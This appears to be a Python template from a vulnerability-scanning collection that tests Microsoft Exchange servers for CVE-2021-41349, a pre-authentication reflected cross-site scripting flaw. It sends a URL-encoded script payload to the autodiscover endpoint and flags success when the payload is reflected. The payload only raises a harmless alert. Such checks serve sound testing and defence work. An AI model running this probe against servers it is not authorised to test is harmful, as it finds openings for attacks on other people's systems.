import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Microsoft Exchange Server Pre-Auth POST Based Reflected Cross-Site Scripting''',
        "description": '''Microsoft Exchange Server is vulnerable to a spoofing vulnerability. Be aware this CVE ID is unique from CVE-2021-42305.''',
        "severity": "medium",
        "references": [
            "https://www.microsoft.com/en-us/download/details.aspx?id=103643", 
            "https://github.com/httpvoid/CVE-Reverse/tree/master/CVE-2021-41349", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-41349", 
            "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-41349"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2021-41349",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "xss", "microsoft", "exchange"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/autodiscover/autodiscover.json"""
        method = "POST"
        data = """%3Cscript%3Ealert%28document.domain%29%3B+a=%22%3C%2Fscript%3E&x=1"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""alert(document.domain);""" in resp0.text and """a=""" in resp0.text) and ("""text/html""" in str(resp0.headers)) and (resp0.status_code == 500):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url